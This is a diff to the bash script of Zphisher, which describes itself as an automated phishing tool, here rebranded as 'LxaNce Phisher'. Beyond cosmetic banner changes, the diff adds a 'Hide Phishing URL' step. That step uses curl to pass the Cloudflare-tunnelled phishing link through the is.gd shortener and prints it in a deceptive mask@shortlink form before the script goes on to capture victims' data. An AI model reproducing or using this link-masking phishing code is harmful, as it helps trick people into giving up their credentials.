@@ -1,4 +1,5 @@
 #!/bin/bash
+# Bash Script for Hide Phishing URL Created by KP
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	Prince Katiyar 
@@ -142,10 +143,10 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${GREEN}
-		${GREEN}        _     _ _______ __   _ _______ _______       _____  _     _ _____ _______ _     _ _______  ______
-		${GREEN} |       \___/  |_____| | \  | |       |______      |_____] |_____|   |   |______ |_____| |______ |_____/
-		${GREEN} |_____ _/   \_ |     | |  \_| |_____  |______      |       |     | __|__ ______| |     | |______ |    \_
-                                                                                                          ${RED}Version : 2.2
+		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
+		${GREEN} 	|L|x|a|N|c|e| |P|h|i|s|h|e|r|
+		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
+							${RED}Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce(Prince Katiyar)${WHITE}
 	EOF
@@ -157,7 +158,9 @@ banner_small() {
 		${BLUE}
 		${BLUE}░█░░░█░█░░░░█▀█░█░█░▀█▀░█▀▀░█░█
 		${BLUE}░█░░░▄▀▄░░░░█▀▀░█▀█░░█░░▀▀█░█▀█
-		${BLUE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀${WHITE} 2.2
+		${BLUE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀
+							${WHITE} 2.2
+							
 	EOF
 }
 
@@ -417,8 +420,17 @@ start_cloudflared() {
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
 	cldflr_link1=${cldflr_link#https://}
+	
+	# Bash Script for Hide Phishing URL Created by KP
+	
+	short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${cldflr_link})
+	shorter=${short#https://}
+	final=$shorter
+	echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
+	
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$final"
 	capture_data
 }
 
